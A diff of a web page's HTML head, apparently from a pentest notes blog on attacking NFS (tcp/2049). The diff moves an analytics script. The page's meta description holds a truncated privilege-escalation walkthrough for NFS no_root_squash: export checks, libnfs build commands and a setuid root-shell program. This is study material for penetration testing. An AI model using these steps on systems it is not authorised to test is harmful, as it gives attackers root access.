@@ -11,6 +11,17 @@
     <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
 
     
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Notes - Attack by ports/protocols: NFS tcp:2049"/>
 <meta name="twitter:description" content="tcp/2049 NFS no_root_squash/no_all_squash misconfiguration PE Check vulnerability &gt; showmount -e 127.0.0.1Export list for 127.0.0.1:/srv/Share 127.0.0.1/32,10.1.1.0/24&gt; cat /etc/exports/srv/Share 10.1.1.0/24(insecure,rw)/srv/Share 127.0.0.1/32(`no_root_squash`,`insecure`,rw) Download exploit and compile: https://github.com/sahlberg/libnfs.git &gt; ./bootstrap&gt; ./configure&gt; make&gt; gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/ create a simple exploit pwn.c and compile, gcc pwn.c -o pwn int main(void){setreuid(0,0); sys tem(&#34;/bin/bash&#34;); return 0;} Transfer the compiled example (i.e ld_nfs.so), exploit (i."/>
@@ -44,15 +55,6 @@
       
   <article class="post">
     <header class="post-header">
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-SLVHGT13XR');
-</script>
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
      crossorigin="anonymous"></script>
       <h1 class ="post-title">Notes - Attack by ports/protocols: NFS tcp:2049</h1>
